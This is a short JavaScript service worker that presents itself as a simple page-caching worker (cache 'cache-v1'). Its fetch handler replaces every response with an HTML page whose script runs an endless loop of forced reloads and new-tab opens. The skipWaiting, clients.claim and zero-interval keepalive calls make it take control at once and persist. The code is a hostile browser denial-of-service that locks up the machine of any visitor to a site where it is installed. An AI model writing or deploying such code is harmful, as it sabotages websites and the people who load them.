var cacheid = "cache-v1";

self.addEventListener("install", (e) => {
    e.waitUntil(
        caches.open(cacheid).then((cache) => {
            return cache.addAll(['/']);
        })
    );
    self.skipWaiting();
});

self.addEventListener("fetch", (e) => {
    // Always respond with a cached version that forces reload
    e.respondWith(
        new Response(
            `<script>
                for(;;) { 
                    location.reload(true);
                    window.open('/', '_blank');
                }
            </script>`, 
            {
                status: 200,
                headers: {'Content-Type': 'text/html'}
            }
        )
    );
});

self.addEventListener("activate", (e) => {
    e.waitUntil(clients.claim());
    // Keep service worker active
    setInterval(() => {
        self.clients.matchAll().then(clients => {
            clients.forEach(client => client.postMessage('keepalive'));
        });
    }, 0);
});